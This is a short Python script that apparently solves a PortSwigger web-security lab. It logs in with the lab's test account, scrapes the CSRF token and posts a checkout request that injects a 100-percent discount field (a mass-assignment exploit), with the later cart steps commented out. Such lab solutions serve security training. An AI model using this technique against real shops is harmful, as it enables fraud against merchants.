import time
import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
update_price = burp_url + '/api/products/1/price'
cart_url = burp_url + '/cart'
placimy = burp_url + '/cart/checkout'
check_api = burp_url + '/api/checkout'

session = requests.Session()
response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf_token = match.group(1)
burp_data = {"csrf": csrf_token,"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)

burp_json={"chosen_discount": {"percentage": 100}, "chosen_products": [{"product_id": "1", "quantity": 1}]}
session.post(check_api, json=burp_json)

#burp_data = {"productId": "1", "redir": "PRODUCT", "quantity": "2"}
#response = session.post(cart_url, data=burp_data)



#response = session.get(cart_url)
#csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
#csrf = csrf_token_match.group(1)

#burp_data = {"csrf": csrf}
#session.post(placimy, data=burp_data)
